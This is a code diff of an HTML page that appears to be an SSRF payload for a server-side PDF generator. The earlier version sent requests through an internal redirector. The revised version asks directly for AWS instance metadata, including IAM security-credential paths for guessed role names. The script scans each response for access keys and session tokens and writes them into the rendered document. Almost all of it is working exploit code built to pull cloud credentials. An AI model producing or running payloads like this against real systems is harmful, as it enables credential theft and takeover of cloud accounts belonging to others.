@@ -1,96 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Redirector Direct</title>
+    <title>PDF Generator Direct AWS Access</title>
 </head>
 <body>
-    <h1>🎯 Internal Redirector Direct AWS Attack</h1>
+    <h1>📄 PDF Generator Direct AWS Metadata Access</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Since 127.0.0.1/redir.php works (176KB response), test it directly against AWS
-        var directTests = [
-            // Test confirmed working internal redirector against AWS metadata
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+        // Test if the PDF generator can directly access AWS metadata (without redirector)
+        var directAWSTests = [
+            // Direct AWS metadata access (PDF generator might have different permissions)
+            { url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS Metadata Root' },
+            { url: 'http://169.254.169.254/latest/meta-data/iam/', desc: 'IAM Root' },
+            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'Security Credentials List' },
+            { url: 'http://169.254.169.254/latest/user-data/', desc: 'User Data' },
             
-            // Try AWS metadata v1 (might not need token)
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
-            
-            // Try older AWS versions
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
-            
-            // Try specific role names we've seen mentioned
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
-            
-            // Try user data
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
+            // Try older AWS API versions (might not have token requirements)
+            { url: 'http://169.254.169.254/1.0/meta-data/', desc: 'AWS v1.0 Metadata' },
+            { url: 'http://169.254.169.254/1.0/meta-data/iam/security-credentials/', desc: 'AWS v1.0 IAM Credentials' },
+            { url: 'http://169.254.169.254/2007-01-19/meta-data/', desc: 'AWS 2007 API' },
+            { url: 'http://169.254.169.254/2008-02-01/meta-data/', desc: 'AWS 2008 API' },
+            { url: 'http://169.254.169.254/2009-04-04/meta-data/', desc: 'AWS 2009 API' },
             
             // Try without version prefix
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/',
-            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/iam/security-credentials/',
+            { url: 'http://169.254.169.254/meta-data/', desc: 'Metadata without version' },
+            { url: 'http://169.254.169.254/iam/security-credentials/', desc: 'IAM without version' },
             
-            // Test basic connectivity confirmation
-            'http://127.0.0.1/redir.php?url=http://httpbin.org/get',
-            'http://127.0.0.1/redir.php?url=http://httpbin.org/ip',
+            // Try specific AWS metadata endpoints
+            { url: 'http://169.254.169.254/latest/meta-data/ami-id', desc: 'AMI ID' },
+            { url: 'http://169.254.169.254/latest/meta-data/instance-id', desc: 'Instance ID' },
+            { url: 'http://169.254.169.254/latest/meta-data/instance-type', desc: 'Instance Type' },
+            { url: 'http://169.254.169.254/latest/meta-data/local-hostname', desc: 'Local Hostname' },
+            { url: 'http://169.254.169.254/latest/meta-data/public-hostname', desc: 'Public Hostname' },
+            { url: 'http://169.254.169.254/latest/meta-data/public-ipv4', desc: 'Public IP' },
+            { url: 'http://169.254.169.254/latest/meta-data/placement/', desc: 'Placement Info' },
             
-            // Test if internal redirector can access itself
-            'http://127.0.0.1/redir.php?url=http://127.0.0.1/',
-            'http://127.0.0.1/redir.php?url=http://localhost/',
+            // Try known role names
+            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role', desc: 'S3Role Credentials' },
+            { url: 'http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role', desc: 'S3Role v1.0' },
+            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role', desc: 'EC2Role Credentials' },
+            { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/DefaultRole', desc: 'DefaultRole Credentials' },
             
-            // Try other internal addresses 
-            'http://127.0.0.1/redir.php?url=http://172.16.0.1/',
-            'http://127.0.0.1/redir.php?url=http://10.0.0.1/',
-            'http://127.0.0.1/redir.php?url=http://192.168.1.1/',
+            // Try alternative metadata service hostnames
+            { url: 'http://metadata.ec2.internal/latest/meta-data/', desc: 'Internal metadata hostname' },
+            { url: 'http://instance-data.ec2.internal/latest/meta-data/', desc: 'Instance data hostname' },
         ];
         
-        for(var i = 0; i < directTests.length; i++) {
+        for(var i = 0; i < directAWSTests.length; i++) {
             try {
-                results += "<h3>🔍 " + (i+1) + ": " + directTests[i].split('url=')[1] + "</h3>";
+                var test = directAWSTests[i];
+                results += "<h3>☁️ " + (i+1) + ": " + test.desc + "</h3>";
+                results += "<div style='font-size:11px;color:#666;margin-bottom:5px;'>" + test.url + "</div>";
+                
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(directTests[i]), false);
+                xhr.open('GET', test.url, false);
                 xhr.send();
                 
-                if(xhr.responseText && xhr.responseText.trim().length > 5) {
+                if(xhr.responseText && xhr.responseText.trim().length > 0) {
                     results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ RESPONSE: " + xhr.responseText.length + " bytes</div>";
                     
                     // Check for AWS credentials
                     var text = xhr.responseText.toLowerCase();
                     if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
-                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;font-weight:bold;'>🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨</div>";
+                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;font-weight:bold;text-align:center;font-size:14px;'>🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨</div>";
                     }
-                    if(text.includes('asia') && (text.includes('secret') || text.includes('key'))) {
-                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 AWS ACCESS KEY DETECTED! 🔑</div>";
+                    if(text.includes('asia') && text.includes('secret')) {
+                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 AWS ACCESS KEY PATTERN DETECTED!</div>";
                     }
-                    if(text.includes('token') && text.includes('expiration')) {
-                        results += "<div style='background:#32cd32;color:white;padding:10px;'>🎯 AWS SESSION TOKEN FOUND!</div>";
+                    if(text.includes('{') && (text.includes('token') || text.includes('key'))) {
+                        results += "<div style='background:#32cd32;color:white;padding:10px;'>📋 JSON CREDENTIAL RESPONSE!</div>";
                     }
-                    if(text.includes('s3role') || text.includes('ec2role')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎭 IAM ROLE NAME FOUND!</div>";
+                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎭 IAM ROLE DETECTED!</div>";
                     }
-                    if(text.includes('ami-') || text.includes('vpc-') || text.includes('subnet-')) {
-                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS INSTANCE METADATA!</div>";
+                    if(text.includes('ami-') || text.includes('i-') || text.includes('vol-') || text.includes('subnet-')) {
+                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS RESOURCE IDENTIFIERS!</div>";
                     }
                     if(text.includes('401') || text.includes('unauthorized')) {
-                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized</div>";
+                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized (needs token)</div>";
                     }
-                    if(text.includes('origin') && text.includes('54.209.100.76')) {
-                        results += "<div style='background:#98fb98;padding:8px;'>🌐 Confirmed SSRF working!</div>";
+                    if(text.includes('403') || text.includes('forbidden')) {
+                        results += "<div style='background:#ffcccb;padding:8px;'>🚫 403 Forbidden</div>";
+                    }
+                    if(!text.includes('401') && !text.includes('403') && !text.includes('unauthorized') && !text.includes('forbidden')) {
+                        results += "<div style='background:#90ee90;padding:8px;'>✅ Successful Access (No Auth Error!)</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:10px;max-height:250px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                 } else {
                     results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 50) + "</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 60) + "</div>";
             }
         }
         
